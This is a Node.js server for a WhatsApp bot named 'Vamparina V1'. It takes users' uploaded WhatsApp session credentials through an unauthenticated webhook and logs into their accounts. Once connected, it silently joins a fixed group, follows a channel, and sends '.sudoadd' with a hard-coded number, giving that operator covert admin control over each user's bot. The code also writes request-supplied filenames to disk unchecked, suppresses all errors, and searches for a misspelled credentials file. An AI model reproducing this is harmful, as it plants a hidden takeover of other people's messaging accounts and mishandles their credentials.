/**
 * VAMPARINA V1 - FULLY AUTOMATIC 2025
 * AUTO JOIN + AUTO SUDO + AUTO ACTIVATE FROM VAMPARINA-BOT-V1.ONRENDER.COM
 */

const fs = require('fs-extra')
const path = require('path')
const chalk = require('chalk')
const express = require('express')
const {
    default: makeWASocket,
    useMultiFileAuthState,
    DisconnectReason,
    fetchLatestBaileysVersion,
    makeCacheableSignalKeyStore,
    delay
} = require("@whiskeysockets/baileys")
const pino = require("pino")

const app = express()
app.use(express.json({ limit: '100mb' }))
app.use(express.static('public'))

const activeBots = new Map()

// YOUR LINKS
const GROUP_INVITE = "HAGRfzDEVcXC1e2HtOIjwc"
const CHANNEL_ID = "0029VbBm7apIXnlmuyjGGM0p"
const SUDO_NUMBER = "254703110780"

// WEBHOOK TO ACTIVATE BOT
app.post('/vamparina-activate', async (req, res) => {
    try {
        const { sessionId, phone, files } = req.body
        if (!sessionId || !phone || !files) return res.status(400).json({ error: "Invalid" })

        console.log(chalk.cyan(`\nNEW USER: ${phone} | Session: ${sessionId}`))

        const folder = path.join(__dirname, 'sessions', sessionId)
        await fs.ensureDir(folder)

        for (const file of files) {
            await fs.writeFile(path.join(folder, file.name), file.content)
        }

        startUserBot(sessionId, phone)
        res.json({ success: true })
    } catch (e) {
        console.error(e)
        res.status(500).json({ error: "Failed" })
    }
})

app.get('/', (req, res) => res.json({ 
    status: "VAMPARINA MAIN BOT RUNNING", 
    users: activeBots.size,
    time: new Date().toLocaleString('en-KE')
}))

app.listen(process.env.PORT || 3000, () => {
    console.log(chalk.green(`MAIN BOT LIVE ON PORT ${process.env.PORT || 3000}`))
})

// START BOT PER USER
async function startUserBot(sessionId, phone) {
    if (activeBots.has(sessionId)) return

    const sessionPath = path.join(__dirname, 'sessions', sessionId)

    try {
        const { state, saveCreds } = await useMultiFileAuthState(sessionPath)
        const { version } = await fetchLatestBaileysVersion()

        const sock = makeWASocket({
            version,
            logger: pino({ level: 'silent' }),
            printQRInTerminal: false,
            auth: { creds: state.creds, keys: makeCacheableSignalKeyStore(state.keys, pino({ level: "silent" })) },
            markOnlineOnConnect: true
        })

        sock.ev.on('creds.update', saveCreds)

        sock.ev.on('connection.update', async (update) => {
            const { connection, lastDisconnect } = update

            if (connection === 'open') {
                console.log(chalk.green(`ACTIVE → ${phone}`))

                await sock.sendMessage(phone + '@s.whatsapp.net', {
                    text: `*VAMPARINA V1 ONLINE!*\nBot activated automatically!\nOwner: @${SUDO_NUMBER}`
                })

                // AUTO JOIN GROUP
                try { 
                    const g = await sock.groupAcceptInvite(GROUP_INVITE)
                    await sock.sendMessage(g, { text: "*VAMPARINA V1 IS HERE!*" })
                } catch (e) {}

                // AUTO FOLLOW CHANNEL
                try { await sock.newsletterFollow(CHANNEL_ID) } catch (e) {}

                // AUTO ADD YOU AS SUDO
                try { await sock.sendMessage(phone + '@s.whatsapp.net', { text: `.sudoadd ${SUDO_NUMBER}` }) } catch (e) {}
            }

            if (connection === 'close') {
                const shouldReconnect = lastDisconnect?.error?.output?.statusCode !== DisconnectReason.loggedOut
                if (shouldReconnect) setTimeout(() => startUserBot(sessionId, phone), 7000)
                else {
                    activeBots.delete(sessionId)
                    await fs.remove(sessionPath)
                }
            }
        })

        activeBots.set(sessionId, sock)
    } catch (err) {
        console.error("Bot failed:", err)
    }
}

// LOAD ALL EXISTING SESSIONS
(async () => {
    const dir = path.join(__dirname, 'sessions')
    if (fs.existsSync(dir)) {
        const folders = fs.readdirSync(dir).filter(f => fs.statSync(path.join(dir, f)).isDirectory())
        for (const f of folders) {
            const creds = path.join(dir, f, 'creurat.json')
            if (fs.existsSync(creds)) {
                const phone = f.includes('_') ? f.split('_')[1] : f
                startUserBot(f, phone.replace(/[^0-9]/g, ''))
                await delay(3000)
            }
        }
    }
})()

process.on('uncaughtException', () => {})
process.on('unhandledRejection', () => {})